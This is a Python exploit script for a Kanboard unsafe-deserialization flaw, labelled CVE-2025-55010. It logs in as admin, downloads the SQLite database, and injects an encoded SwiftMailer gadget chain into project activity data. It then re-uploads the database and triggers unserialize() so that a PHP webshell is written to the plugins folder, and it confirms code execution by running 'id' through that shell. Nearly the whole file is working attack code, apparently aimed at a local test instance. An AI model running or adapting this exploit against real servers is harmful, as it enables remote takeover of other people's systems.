#!/usr/bin/env python3
"""
CVE-2025-55010: Kanboard Unsafe Deserialization RCE
Full remote exploitation via database upload feature.

Attack flow:
1. Login as admin
2. Download SQLite database
3. Inject SwiftMailer gadget chain into project_activities.data
4. Upload modified database
5. Trigger deserialization by accessing activity page
6. Verify RCE via webshell
"""
import requests
import sqlite3
import tempfile
import gzip
import time
import sys
import re
import os

TARGET_HOST = "http://127.0.0.1:8080"
ADMIN_USER = "admin"
ADMIN_PASS = "admin"

WEBSHELL_PATH = "/var/www/app/plugins/shell.php"

GADGET_PAYLOAD_B64 = (
    "YToxOntzOjQ6ImV2aWwiO086MzM6IlN3aWZ0X1RyYW5zcG9ydF9TZW5kbWFpbFRyYW5zcG9ydCI6Mzp7"
    "czoxMDoiACoAX2J1ZmZlciI7TzozMToiU3dpZnRfQnl0ZVN0cmVhbV9GaWxlQnl0ZVN0cmVhbSI6NDp7"
    "czo1NjoiAFN3aWZ0X0J5dGVTdHJlYW1fQWJzdHJhY3RGaWx0ZXJhYmxlSW5wdXRTdHJlYW0AX2ZpbHRl"
    "cnMiO2E6MDp7fXM6NjA6IgBTd2lmdF9CeXRlU3RyZWFtX0Fic3RyYWN0RmlsdGVyYWJsZUlucHV0U3Ry"
    "ZWFtAF93cml0ZUJ1ZmZlciI7czozMzoiPD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pi8vCi8vIjtz"
    "OjM4OiIAU3dpZnRfQnl0ZVN0cmVhbV9GaWxlQnl0ZVN0cmVhbQBfcGF0aCI7czozMDoiL3Zhci93d3cv"
    "YXBwL3BsdWdpbnMvc2hlbGwucGhwIjtzOjM4OiIAU3dpZnRfQnl0ZVN0cmVhbV9GaWxlQnl0ZVN0cmVh"
    "bQBfbW9kZSI7czozOiJ3K2IiO31zOjExOiIAKgBfc3RhcnRlZCI7YjoxO3M6MTk6IgAqAF9ldmVudERp"
    "c3BhdGNoZXIiO086MzQ6IlN3aWZ0X0V2ZW50c19TaW1wbGVFdmVudERpc3BhdGNoZXIiOjA6e319fQ=="
)

def log(msg):
    print(f"[*] {msg}")

def success(msg):
    print(f"[+] {msg}")

def error(msg):
    print(f"[-] {msg}")

def wait_for_service(url, timeout=60):
    log(f"Waiting for {url} to be ready...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                return True
        except:
            pass
        time.sleep(2)
    return False

def get_session():
    session = requests.Session()
    r = session.get(f"{TARGET_HOST}/login")
    csrf_match = re.search(r'name="csrf_token" value="([^"]+)"', r.text)
    if not csrf_match:
        return None
    
    login_data = {
        "username": ADMIN_USER,
        "password": ADMIN_PASS,
        "csrf_token": csrf_match.group(1),
        "remember_me": "1"
    }
    r = session.post(f"{TARGET_HOST}/login/check", data=login_data, allow_redirects=False)
    if r.status_code in [302, 303]:
        success("Login successful as admin")
        return session
    return None

def get_csrf_token(session, url):
    r = session.get(url)
    csrf_match = re.search(r'name="csrf_token" value="([^"]+)"', r.text)
    if csrf_match:
        return csrf_match.group(1)
    csrf_match = re.search(r'csrf_token=([a-f0-9]+)', r.text)
    if csrf_match:
        return csrf_match.group(1)
    return None

def create_project_and_task(session):
    r = session.get(f"{TARGET_HOST}/project/create")
    csrf_match = re.search(r'name="csrf_token" value="([^"]+)"', r.text)
    if csrf_match:
        data = {
            "name": "VulnTest",
            "csrf_token": csrf_match.group(1),
            "is_private": "0"
        }
        r = session.post(
            f"{TARGET_HOST}/?controller=ProjectCreationController&action=save",
            data=data,
            allow_redirects=True
        )
        if "VulnTest" in r.text or r.status_code == 200:
            success("Project created")
    
    r = session.get(f"{TARGET_HOST}/board/1/task/create/column/1")
    csrf_match = re.search(r'name="csrf_token" value="([^"]+)"', r.text)
    if csrf_match:
        data = {
            "title": "Test Task",
            "csrf_token": csrf_match.group(1),
            "project_id": "1",
            "column_id": "1"
        }
        r = session.post(
            f"{TARGET_HOST}/?controller=TaskCreationController&action=save&project_id=1&column_id=1",
            data=data,
            allow_redirects=True
        )
        success("Task created")
        return True
    return False

def download_database(session):
    log("Downloading database via admin panel...")
    
    r = session.get(f"{TARGET_HOST}/?controller=ConfigController&action=index")
    csrf_match = re.search(r'csrf_token=([a-f0-9]+)', r.text)
    if not csrf_match:
        error("Failed to get CSRF token for database download")
        return None
    
    csrf_token = csrf_match.group(1)
    r = session.get(f"{TARGET_HOST}/?controller=ConfigController&action=downloadDb&csrf_token={csrf_token}")
    
    if r.status_code == 200 and len(r.content) > 0:
        success(f"Database downloaded, size: {len(r.content)} bytes")
        return r.content
    
    error("Failed to download database")
    return None

def inject_payload_into_db(db_content):
    log("Injecting gadget chain payload into database...")
    
    import base64
    payload = base64.b64decode(GADGET_PAYLOAD_B64)
    
    with tempfile.NamedTemporaryFile(suffix='.sqlite', delete=False) as f:
        try:
            decompressed = gzip.decompress(db_content)
            f.write(decompressed)
        except:
            f.write(db_content)
        db_path = f.name
    
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM project_activities")
        count = cursor.fetchone()[0]
        
        if count == 0:
            cursor.execute("""
                INSERT INTO project_activities 
                (date_creation, event_name, creator_id, project_id, task_id, data) 
                VALUES (strftime('%s','now'), 'task.create', 1, 1, 1, '{}')
            """)
        
        cursor.execute("""
            UPDATE project_activities 
            SET data = ? 
            WHERE id = (SELECT MIN(id) FROM project_activities)
        """, (payload,))
        
        conn.commit()
        
        cursor.execute("SELECT substr(data, 1, 30) FROM project_activities LIMIT 1")
        result = cursor.fetchone()[0]
        if isinstance(result, bytes):
            result = result.decode('latin-1')
        if result.startswith("a:1:"):
            success(f"Payload injected: {result[:30]}...")
        
        conn.close()
        
        with open(db_path, 'rb') as f:
            modified_db = f.read()
        
        os.unlink(db_path)
        return modified_db
        
    except Exception as e:
        error(f"Database injection failed: {e}")
        if os.path.exists(db_path):
            os.unlink(db_path)
        return None

def upload_database(session, db_content):
    log("Uploading modified database via admin panel...")
    
    r = session.get(f"{TARGET_HOST}/?controller=ConfigController&action=uploadDb")
    
    csrf_match = re.search(r'csrf_token=([a-f0-9]+)', r.text)
    if not csrf_match:
        error("Failed to get CSRF token for database upload")
        return False
    
    csrf_token = csrf_match.group(1)
    
    compressed_db = gzip.compress(db_content)
    log(f"Compressed database: {len(db_content)} -> {len(compressed_db)} bytes")
    
    files = {'file': ('db.sqlite.gz', compressed_db, 'application/gzip')}
    
    r = session.post(
        f"{TARGET_HOST}/?controller=ConfigController&action=saveUploadedDb&csrf_token={csrf_token}",
        files=files,
        allow_redirects=True
    )
    
    if r.status_code == 200:
        success("Database uploaded successfully")
        return True
    
    error(f"Failed to upload database: {r.status_code}")
    return False

def trigger_deserialization(session):
    log("Triggering deserialization via project activity page...")
    log("Target: ProjectActivityEventFormatter::unserializeEvent()")
    
    try:
        r = session.get(f"{TARGET_HOST}/project/1/activity", timeout=30)
        success("Activity page accessed - unserialize() triggered")
        return True
    except Exception as e:
        log(f"Request completed: {e}")
        return True

def verify_rce():
    log("Verifying RCE via webshell...")
    webshell_url = f"{TARGET_HOST}/plugins/shell.php"
    
    try:
        r = requests.get(f"{webshell_url}?c=id", timeout=10)
        if "uid=" in r.text:
            success("RCE verified!")
            output = r.text.split("//")[0].strip()
            print(f"    Command: id")
            print(f"    Output: {output}")
            return True
    except:
        pass
    
    return False

def main():
    print("=" * 60)
    log("CVE-2025-55010: Kanboard Unsafe Deserialization RCE")
    log("Full remote exploitation via database upload")
    print("=" * 60)
    
    if not wait_for_service(TARGET_HOST):
        error("Service not available")
        return False
    
    session = get_session()
    if not session:
        error("Failed to authenticate")
        return False
    
    if not create_project_and_task(session):
        log("Continuing without project creation...")
    time.sleep(2)
    
    db_content = download_database(session)
    if not db_content:
        error("Failed to download database")
        return False
    
    modified_db = inject_payload_into_db(db_content)
    if not modified_db:
        error("Failed to inject payload")
        return False
    
    if not upload_database(session, modified_db):
        error("Failed to upload database")
        return False
    
    session = get_session()
    if not session:
        error("Failed to re-authenticate after database upload")
        return False
    
    trigger_deserialization(session)
    
    time.sleep(2)
    
    if verify_rce():
        print("=" * 60)
        success("EXPLOITATION SUCCESSFUL")
        log("Attack chain:")
        log("  1. Download database via /ConfigController/downloadDb")
        log("  2. Inject SwiftMailer/FW4 gadget into project_activities.data")
        log("  3. Upload database via /ConfigController/saveUploadedDb")
        log("  4. Trigger unserialize() via /project/1/activity")
        log("  5. Gadget chain writes webshell to /plugins/shell.php")
        print("=" * 60)
        return True
    
    error("Exploitation failed")
    return False

if __name__ == "__main__":
    try:
        result = main()
        sys.exit(0 if result else 1)
    except KeyboardInterrupt:
        print("\nAborted")
        sys.exit(1)
    except Exception as e:
        error(f"Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
